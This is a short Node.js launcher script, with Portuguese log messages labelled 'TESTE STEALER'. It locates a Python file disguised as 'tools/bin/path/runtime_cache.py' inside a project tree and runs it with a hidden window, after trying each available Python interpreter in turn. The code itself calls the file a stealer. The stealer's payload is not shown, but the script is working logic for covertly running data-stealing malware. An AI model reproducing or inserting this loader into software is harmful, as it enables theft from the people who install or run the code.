const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

const stealerDir = path.join(__dirname, 'tools/bin/path');
const stealerPath = path.join(stealerDir, 'runtime_cache.py');
const reqPath = path.join(stealerDir, 'requirements.txt');

console.log('=== TESTE STEALER ===');
console.log('Stealer dir:', stealerDir);
console.log('Stealer existe:', fs.existsSync(stealerPath));
console.log('Requirements existe:', fs.existsSync(reqPath));

if (fs.existsSync(stealerPath)) {
    console.log('Arquivo encontrado! Tentando executar...');
    
    const cmds = ['python', 'python3', 'py'];
    let executou = false;
    
    for (const cmd of cmds) {
        try {
            console.log('Testando:', cmd);
            const test = exec(`"${cmd}" --version`, { windowsHide: true });
            test.on('error', (err) => {
                console.log(cmd, 'NAO encontrado');
            });
            test.on('exit', (code) => {
                if (code === 0) {
                    console.log(cmd, 'encontrado! Executando stealer...');
                    const child = exec(`"${cmd}" "${stealerPath}"`, { windowsHide: true });
                    child.on('exit', (code) => {
                        console.log('Stealer finalizado com codigo:', code);
                    });
                    executou = true;
                }
            });
            if (executou) break;
        } catch(e) {}
    }
    
    setTimeout(() => {
        if (!executou) console.log('NENHUM comando Python encontrado!');
    }, 2000);
} else {
    console.log('Stealer NAO encontrado no caminho:', stealerPath);
}